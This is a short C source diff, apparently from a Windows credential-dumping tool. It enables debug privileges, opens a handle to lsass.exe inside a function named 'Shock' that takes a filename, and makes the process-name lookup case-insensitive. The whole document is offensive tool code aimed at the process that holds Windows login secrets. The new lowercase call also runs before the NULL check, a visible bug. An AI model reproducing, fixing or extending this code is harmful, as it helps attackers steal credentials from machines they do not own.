@@ -294,6 +294,14 @@ char* GetProcNameFromHandle(HANDLE process_handle) {
 }
 
 
+void to_lowercase(char* str) {
+    while (*str) {
+        *str = tolower((unsigned char)*str);  // Convert each character to lowercase
+        str++;
+    }
+}
+
+
 HANDLE GetProcessByName(const char* proc_name) {
     HANDLE aux_handle = NULL;
 
@@ -302,6 +310,7 @@ HANDLE GetProcessByName(const char* proc_name) {
         char* current_proc_name = GetProcNameFromHandle(aux_handle);
         //printf("aux_handle: %d\n", aux_handle);
         //printf("[+] current_proc_name: %s\n ", current_proc_name);
+        to_lowercase(current_proc_name);
         if (current_proc_name && strcmp(current_proc_name, proc_name) == 0) {
             return aux_handle;
         }
@@ -352,7 +361,7 @@ void replace_backslash(char* str, char* result) {
 
 int Shock(const char* filename) {
     EnableDebugPrivileges();
-    HANDLE hProcess = GetProcessByName("C:\\WINDOWS\\system32\\lsass.exe");
+    HANDLE hProcess = GetProcessByName("c:\\windows\\system32\\lsass.exe");
     printf("[+] Process handle:\t%d\n", hProcess);
 
     // List to get modules information
